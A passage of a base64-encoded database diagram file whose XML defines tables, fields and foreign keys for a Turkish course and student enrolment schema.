dWU9IjIwOTszNzQiLz4KCQkJPC9Qcm9wZXJ0aWVzPgoJCQk8VHlwZSB2YWx1ZT0iVGFibGUiLz4KCQk8L1RhYmxlMj4KCQk8VGFibGUzPgoJCQk8UGFyZW50IHZhbHVlPSIjVE9QIi8+CgkJCTxQcm9wZXJ0aWVzPgoJCQkJPF5jaGVja3MgdmFsdWU9IjAiLz4KCQkJCTxeZ3JvdXAgdmFsdWU9Ii0xIi8+CgkJCQk8XmhlaWdodCB2YWx1ZT0iLTEiLz4KCQkJCTxeaW5kZXhlcyB2YWx1ZT0iMCIvPgoJCQkJPF5sZXZlbCB2YWx1ZT0iMiIvPgoJCQkJPF5saW5rcyB2YWx1ZT0iMCIvPgoJCQkJPF5sb2NrIHZhbHVlPSIwIi8+CgkJCQk8Xm1ldGhvZHMgdmFsdWU9IjAiLz4KCQkJCTxebWluaW1pemVkIHZhbHVlPSIwIi8+CgkJCQk8XnByb3BlcnRpZXMgdmFsdWU9IjAiLz4KCQkJCTxedHJpZ2dlcnMgdmFsdWU9IjAiLz4KCQkJCTxedW5pcXVlcyB2YWx1ZT0iMCIvPgoJCQkJPGJhY2tfY29sb3IgdmFsdWU9IkI0RDY0NzAwIi8+CgkJCQk8bmFtZSB2YWx1ZT0iVGFibGUzIi8+CgkJCQk8cG9zaXRpb24gdmFsdWU9IjIwMDs0OTAiLz4KCQkJCTxzaXplIHZhbHVlPSIxOTk7MTIyIi8+CgkJCTwvUHJvcGVydGllcz4KCQkJPFR5cGUgdmFsdWU9IlRhYmxlIi8+CgkJPC9UYWJsZTM+CgkJPFRhYmxlND4KCQkJPFBhcmVudCB2YWx1ZT0iI1RPUCIvPgoJCQk8UHJvcGVydGllcz4KCQkJCTxeY2hlY2tzIHZhbHVlPSIwIi8+CgkJCQk8Xmdyb3VwIHZhbHVlPSItMSIvPgoJCQkJPF5oZWlnaHQgdmFsdWU9Ii0xIi8+CgkJCQk8XmluZGV4ZXMgdmFsdWU9IjAiLz4KCQkJCTxebGV2ZWwgdmFsdWU9IjEiLz4KCQkJCTxebGlua3MgdmFsdWU9IjAiLz4KCQkJCTxebG9jayB2YWx1ZT0iMCIvPgoJCQkJPF5tZXRob2RzIHZhbHVlPSIwIi8+CgkJCQk8Xm1pbmltaXplZCB2YWx1ZT0iMCIvPgoJCQkJPF5wcm9wZXJ0aWVzIHZhbHVlPSIwIi8+CgkJCQk8XnRyaWdnZXJzIHZhbHVlPSIwIi8+CgkJCQk8XnVuaXF1ZXMgdmFsdWU9IjAiLz4KCQkJCTxiYWNrX2NvbG9yIHZhbHVlPSJCNEQ2NDcwMCIvPgoJCQkJPG5hbWUgdmFsdWU9IlRhYmxlNCIvPgoJCQkJPHBvc2l0aW9uIHZhbHVlPSI5ODU7NTI2Ii8+CgkJCQk8c2l6ZSB2YWx1ZT0iMTg5OzE1OCIvPgoJCQk8L1Byb3BlcnRpZXM+CgkJCTxUeXBlIHZhbHVlPSJUYWJsZSIvPgoJCTwvVGFibGU0PgoJCTxxcT4KCQkJPFByb3BlcnRpZXM+CgkJCQk8XmxvY2sgdmFsdWU9IjAiLz4KCQkJCTxiYWNrX2NvbG9yIHZhbHVlPSJGRkZGRkYiLz4KCQkJCTxnYW1tYSB2YWx1ZT0iMCIvPgoJCQkJPG5hbWUgdmFsdWU9InFxIi8+CgkJCQk8c2l6ZSB2YWx1ZT0iMjA0ODsyMDQ4Ii8+CgkJCQk8c3R5bGUgdmFsdWU9IjQiLz4KCQkJCTxzdHlsZV9saW5rcyB2YWx1ZT0iMCIvPgoJCQkJPHVuaXRzIHZhbHVlPSI1Ii8+CgkJCTwvUHJvcGVydGllcz4KCQkJPFR5cGUgdmFsdWU9IkRpYWdyYW0iLz4KCQk8L3FxPgoJPC9Db250cm9scz4KCTxHVUk+CgkJPEZ1bGxUb29sYmFyTGVmdCB2YWx1ZT0iMSIvPgoJCTxGdWxsVG9vbGJhclJpZ2h0IHZhbHVlPSIxIi8+CgkJPFBhZ2VFZGl0b3IgdmFsdWU9Ii0xIi8+CgkJPFBhZ2VFZGl0b3JIIHZhbHVlPSIwIi8+CgkJPFBhZ2VUb29sYmFyTGVmdCB2YWx1ZT0iMCIvPgoJCTxQYWdlVG9vbGJhclJCIHZhbHVlPSIwIi8+CgkJPFBhZ2VUb29sYmFyUmlnaHQgdmFsdWU9IjAiLz4KCQk8UGFuZUNsaXBib2FyZCB2YWx1ZT0iMCIvPgoJCTxQYW5lTGF5b3V0IHZhbHVlPSIwIi8+CgkJPFBhbmVWaWV3IHZhbHVlPSIwIi8+CgkJPFNjcm9sbFggdmFsdWU9IjAiLz4KCQk8U2Nyb2xsWSB2YWx1ZT0iMCIvPgoJCTxTZWxlY3Rpb24gdmFsdWU9ImNYRT0iLz4KCQk8U2hvd0FsbCB2YWx1ZT0iMSIvPgoJCTxTaG93Q2hhbmdlcyB2YWx1ZT0iMSIvPgoJCTxTaG93R0wgdmFsdWU9IjEiLz4KCQk8U2hvd0dyaWQgdmFsdWU9IjEiLz4KCQk8VXNlR3JpZCB2YWx1ZT0iMCIvPgoJPC9HVUk+Cgk8TW9kZWw+CgkJPG9iPgoJCQk8bGluaz4KCQkJCTxvMD4KCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCTxDYXJkaW5hbGl0eSB2YWx1ZT0iT05FIHRvIE1BTlkiLz4KCQkJCQkJPENoaWxkX1RhYmxlIHZhbHVlPSJvZ3JlbmNpa2F5aXQiLz4KCQkJCQkJPEZvcmVpZ25fS2V5IHZhbHVlPSJhM1Z5YzA1diIvPgoJCQkJCQk8TmFtZSB2YWx1ZT0iRktfb2dyZW5jaWtheWl0S3Vyc2xhciIvPgoJCQkJCQk8T25fRGVsZXRlIHZhbHVlPSJSZXN0cmljdCIvPgoJCQkJCQk8T25fVXBkYXRlIHZhbHVlPSJSZXN0cmljdCIvPgoJCQkJCQk8UGFyZW50X1RhYmxlIHZhbHVlPSJhY2lsYW5rdXJzbGFyIi8+CgkJCQkJCTxQcmltYXJ5X0tleSB2YWx1ZT0iWVdOcGJHRnVTM1Z5YzJ4aGNrbEUiLz4KCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQk8bmFtZSB2YWx1ZT0iRktfb2dyZW5jaWtheWl0S3Vyc2xhciIvPgoJCQkJPC9vMD4KCQkJCTxvMT4KCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCTxDYXJkaW5hbGl0eSB2YWx1ZT0iT05FIHRvIE1BTlkiLz4KCQkJCQkJPENoaWxkX1RhYmxlIHZhbHVlPSJvZ3JlbmNpa2F5aXQiLz4KCQkJCQkJPEZvcmVpZ25fS2V5IHZhbHVlPSJiMmR5Wlc1amFVNXYiLz4KCQkJCQkJPE5hbWUgdmFsdWU9IkZLX29ncmVuY2lrYXlpdCIvPgoJCQkJCQk8T25fRGVsZXRlIHZhbHVlPSJSZXN0cmljdCIvPgoJCQkJCQk8T25fVXBkYXRlIHZhbHVlPSJSZXN0cmljdCIvPgoJCQkJCQk8UGFyZW50X1RhYmxlIHZhbHVlPSJvZ3JlbmNpbGVyIi8+CgkJCQkJCTxQcmltYXJ5X0tleSB2YWx1ZT0iYjJkeVpXNWphVTV2Ii8+CgkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJPG5hbWUgdmFsdWU9IkZLX29ncmVuY2lrYXlpdCIvPgoJCQkJPC9vMT4KCQkJCTxvMj4KCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCTxDYXJkaW5hbGl0eSB2YWx1ZT0iT05FIHRvIE1BTlkiLz4KCQkJCQkJPENoaWxkX1RhYmxlIHZhbHVlPSJkZXJzcHJvZ3JhbWkiLz4KCQkJCQkJPEZvcmVpZ25fS2V5IHZhbHVlPSJZV05wYkdGdVMzVnljMDV2Ii8+CgkJCQkJCTxOYW1lIHZhbHVlPSJGS19kZXJzcHJvZ3JhbWkiLz4KCQkJCQkJPE9uX0RlbGV0ZSB2YWx1ZT0iUmVzdHJpY3QiLz4KCQkJCQkJPE9uX1VwZGF0ZSB2YWx1ZT0iUmVzdHJpY3QiLz4KCQkJCQkJPFBhcmVudF9UYWJsZSB2YWx1ZT0iYWNpbGFua3Vyc2xhciIvPgoJCQkJCQk8UHJpbWFyeV9LZXkgdmFsdWU9IllXTnBiR0Z1UzNWeWMyeGhja2xFIi8+CgkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJPG5hbWUgdmFsdWU9IkZLX2RlcnNwcm9ncmFtaSIvPgoJCQkJPC9vMj4KCQkJCTxvMz4KCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCTxDYXJkaW5hbGl0eSB2YWx1ZT0iT05FIHRvIE1BTlkiLz4KCQkJCQkJPENoaWxkX1RhYmxlIHZhbHVlPSJhY2lsYW5rdXJzbGFyIi8+CgkJCQkJCTxGb3JlaWduX0tleSB2YWx1ZT0iYTNWeWMwNXYiLz4KCQkJCQkJPE5hbWUgdmFsdWU9IkZLX2FjaWxhbmt1cnNsYXIiLz4KCQkJCQkJPE9uX0RlbGV0ZSB2YWx1ZT0iUmVzdHJpY3QiLz4KCQkJCQkJPE9uX1VwZGF0ZSB2YWx1ZT0iUmVzdHJpY3QiLz4KCQkJCQkJPFBhcmVudF9UYWJsZSB2YWx1ZT0ia3Vyc2thdGFsb2ciLz4KCQkJCQkJPFByaW1hcnlfS2V5IHZhbHVlPSJhM1Z5YzA1diIvPgoJCQkJCTwvUHJvcGVydGllcz4KCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCTxuYW1lIHZhbHVlPSJGS19hY2lsYW5rdXJzbGFyIi8+CgkJCQk8L28zPgoJCQk8L2xpbms+CgkJCTx0YWJsZT4KCQkJCTxvMD4KCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSI1MyIvPgoJCQkJCQk8QXZlcmFnZV9Sb3dfU2l6ZSB2YWx1ZT0iMTA5MiIvPgoJCQkJCQk8Q2hhcnNldCB2YWx1ZT0idXRmOCIvPgoJCQkJCQk8Q29sbGF0aW9uIHZhbHVlPSJ1dGY4X3R1cmtpc2hfY2kiLz4KCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQk8Q3JlYXRlX1RpbWUgdmFsdWU9IjIwMTUtMDItMTYgMTU6NTU6NTYiLz4KCQkJCQkJPEVuZ2luZSB2YWx1ZT0iSW5ub0RCIi8+CgkJCQkJCTxGaWVsZF9Db3VudCB2YWx1ZT0iMTEiLz4KCQkJCQkJPEluZGV4X0NvdW50IHZhbHVlPSI2Ii8+CgkJCQkJCTxMaW5rX0NvdW50IHZhbHVlPSI1Ii8+CgkJCQkJCTxOYW1lIHZhbHVlPSJhY2lsYW5rdXJzbGFyIi8+CgkJCQkJCTxQcmltYXJ5X0tleSB2YWx1ZT0iWVdOcGJHRnVTM1Z5YzJ4aGNrbEUiLz4KCQkJCQkJPFJlY29yZF9Db3VudCB2YWx1ZT0iMTUiLz4KCQkJCQkJPFNpemUgdmFsdWU9Ijk2LjAwIEtiIi8+CgkJCQkJCTxUcmlnZ2VyX0NvdW50IHZhbHVlPSIwIi8+CgkJCQkJCTxVbmlxdWVfQ291bnQgdmFsdWU9IjIiLz4KCQkJCQkJPFVwZGF0ZV9UaW1lIHZhbHVlPSIiLz4KCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJPGNvbnRyb2wgdmFsdWU9IlRhYmxlIi8+CgkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCTxmaWVsZD4KCQkJCQkJPG8wPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8Q2hhcnNldCB2YWx1ZT0idXRmOCIvPgoJCQkJCQkJCTxDb2xsYXRpb24gdmFsdWU9InV0ZjhfdHVya2lzaF9jaSIvPgoJCQkJCQkJCTxDb21tZW50IHZhbHVlPSIiLz4KCQkJCQkJCQk8RGVmYXVsdF9WYWx1ZSB2YWx1ZT0iR2lyaWxtZW1pxZ8iLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjExIi8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSIxMDAiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iYWNpa2xhbWEiLz4KCQkJCQkJCQk8TnVsbGFibGUgdmFsdWU9IjEiLz4KCQkJCQkJCQk8T25fVXBkYXRlX1NldF9DdXJyZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPFByZWNpc2lvbiB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxTY2FsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJWYXJDaGFyIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxVbnNpZ25lZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxaZXJvZmlsbCB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9ImFjaWtsYW1hIi8+CgkJCQkJCTwvbzA+CgkJCQkJCTxvMT4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSIxIi8+CgkJCQkJCQkJPENoYXJzZXQgdmFsdWU9IiIvPgoJCQkJCQkJCTxDb2xsYXRpb24gdmFsdWU9IiIvPgoJCQkJCQkJCTxDb21tZW50IHZhbHVlPSIiLz4KCQkJCQkJCQk8RGVmYXVsdF9WYWx1ZSB2YWx1ZT0iIi8+CgkJCQkJCQkJPEZpZWxkX1Bvc2l0aW9uIHZhbHVlPSIxIi8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjEiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSI2Ii8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9ImFjaWxhbkt1cnNsYXJJRCIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSI3Ii8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9Ik1lZGl1bUludCIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjEiLz4KCQkJCQkJCQk8VW5zaWduZWQgdmFsdWU9IjEiLz4KCQkJCQkJCQk8WmVyb2ZpbGwgdmFsdWU9IjEiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJhY2lsYW5LdXJzbGFySUQiLz4KCQkJCQkJPC9vMT4KCQkJCQkJPG8xMD4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPENoYXJzZXQgdmFsdWU9InV0ZjgiLz4KCQkJCQkJCQk8Q29sbGF0aW9uIHZhbHVlPSJ1dGY4X3R1cmtpc2hfY2kiLz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPERlZmF1bHRfVmFsdWUgdmFsdWU9IiIvPgoJCQkJCQkJCTxGaWVsZF9Qb3NpdGlvbiB2YWx1ZT0iOCIvPgoJCQkJCQkJCTxJbmRleGVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPExlbmd0aCB2YWx1ZT0iMTAiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0ic2FhdCIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IlZhckNoYXIiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0ic2FhdCIvPgoJCQkJCQk8L28xMD4KCQkJCQkJPG8yPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8Q2hhcnNldCB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjUiLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9Ii0xIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9ImJhc2xhbWFUYXJpaGkiLz4KCQkJCQkJCQk8TnVsbGFibGUgdmFsdWU9IjEiLz4KCQkJCQkJCQk8T25fVXBkYXRlX1NldF9DdXJyZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPFByZWNpc2lvbiB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxTY2FsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJEYXRlIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxVbnNpZ25lZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxaZXJvZmlsbCB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9ImJhc2xhbWFUYXJpaGkiLz4KCQkJCQkJPC9vMj4KCQkJCQkJPG8zPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8Q2hhcnNldCB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjYiLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9Ii0xIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9ImJpdGlzVGFyaWhpIi8+CgkJCQkJCQkJPE51bGxhYmxlIHZhbHVlPSIxIi8+CgkJCQkJCQkJPE9uX1VwZGF0ZV9TZXRfQ3VycmVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxQcmVjaXNpb24gdmFsdWU9IjAiLz4KCQkJCQkJCQk8U2NhbGUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VHlwZSB2YWx1ZT0iRGF0ZSIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VW5zaWduZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8WmVyb2ZpbGwgdmFsdWU9IjAiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJiaXRpc1RhcmloaSIvPgoJCQkJCQk8L28zPgoJCQkJCQk8bzQ+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8QXV0b2luY3JlbWVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxDaGFyc2V0IHZhbHVlPSJ1dGY4Ii8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0idXRmOF90dXJraXNoX2NpIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IkI6QmlsaW5taXlvciBBOkRldmFtIEVkaXlvciBUOlRhbWFtbGFuZMSxIi8+CgkJCQkJCQkJPERlZmF1bHRfVmFsdWUgdmFsdWU9IkIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjEwIi8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSIxIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9ImR1cnVtIi8+CgkJCQkJCQkJPE51bGxhYmxlIHZhbHVlPSIxIi8+CgkJCQkJCQkJPE9uX1VwZGF0ZV9TZXRfQ3VycmVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxQcmVjaXNpb24gdmFsdWU9IjAiLz4KCQkJCQkJCQk8U2NhbGUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VHlwZSB2YWx1ZT0iQ2hhciIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VW5zaWduZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8WmVyb2ZpbGwgdmFsdWU9IjAiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJkdXJ1bSIvPgoJCQkJCQk8L280PgoJCQkJCQk8bzU+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8QXV0b2luY3JlbWVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxDaGFyc2V0IHZhbHVlPSJ1dGY4Ii8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0idXRmOF90dXJraXNoX2NpIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjciLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9IjUwIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9Imd1biIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IlZhckNoYXIiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iZ3VuIi8+CgkJCQkJCTwvbzU+CgkJCQkJCTxvNj4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPENoYXJzZXQgdmFsdWU9IiIvPgoJCQkJCQkJCTxDb2xsYXRpb24gdmFsdWU9IiIvPgoJCQkJCQkJCTxDb21tZW50IHZhbHVlPSIiLz4KCQkJCQkJCQk8RGVmYXVsdF9WYWx1ZSB2YWx1ZT0iIi8+CgkJCQkJCQkJPEZpZWxkX1Bvc2l0aW9uIHZhbHVlPSI5Ii8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSIzIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9ImtvbnRlbmphbiIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSI1Ii8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IlNtYWxsaW50Ii8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxVbnNpZ25lZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxaZXJvZmlsbCB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9ImtvbnRlbmphbiIvPgoJCQkJCQk8L282PgoJCQkJCQk8bzc+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8QXV0b2luY3JlbWVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxDaGFyc2V0IHZhbHVlPSIiLz4KCQkJCQkJCQk8Q29sbGF0aW9uIHZhbHVlPSIiLz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPERlZmF1bHRfVmFsdWUgdmFsdWU9IiIvPgoJCQkJCQkJCTxGaWVsZF9Qb3NpdGlvbiB2YWx1ZT0iMiIvPgoJCQkJCQkJCTxJbmRleGVkIHZhbHVlPSIxIi8+CgkJCQkJCQkJPExlbmd0aCB2YWx1ZT0iMyIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJrdXJzTm8iLz4KCQkJCQkJCQk8TnVsbGFibGUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8T25fVXBkYXRlX1NldF9DdXJyZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPFByZWNpc2lvbiB2YWx1ZT0iNSIvPgoJCQkJCQkJCTxTY2FsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJTbWFsbGludCIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VW5zaWduZWQgdmFsdWU9IjEiLz4KCQkJCQkJCQk8WmVyb2ZpbGwgdmFsdWU9IjEiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJrdXJzTm8iLz4KCQkJCQkJPC9vNz4KCQkJCQkJPG84PgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQk